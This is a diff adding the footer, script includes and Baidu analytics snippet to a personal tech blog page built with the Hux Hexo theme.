+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
